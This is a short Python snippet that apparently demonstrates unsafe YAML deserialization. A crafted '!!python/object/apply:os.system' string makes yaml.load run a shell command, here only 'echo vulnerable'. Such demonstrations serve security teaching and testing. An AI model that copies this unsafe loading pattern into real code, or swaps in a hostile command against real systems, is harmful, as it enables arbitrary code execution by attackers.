import yaml

yaml_string = "!!python/object/apply:os.system ['echo vulnerable']"
data = yaml.load(yaml_string)